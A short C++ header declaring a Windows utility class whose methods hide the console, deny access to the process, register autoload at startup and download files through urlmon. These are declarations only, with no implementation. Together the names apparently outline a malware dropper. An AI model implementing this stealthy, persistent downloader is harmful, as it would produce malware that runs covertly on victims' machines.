#include "stdafx.h"
#pragma comment(lib, "urlmon.lib")
using namespace std;

class Utils
{
public:
	void HideConsole();
	BOOL DenyAccess();
	void Autoload(string Name, string Path);
	void DownloadFile(wchar_t *url, wchar_t* dir);
	void CreateDir(wchar_t *dir);
	bool FileExists(const char* fname);
};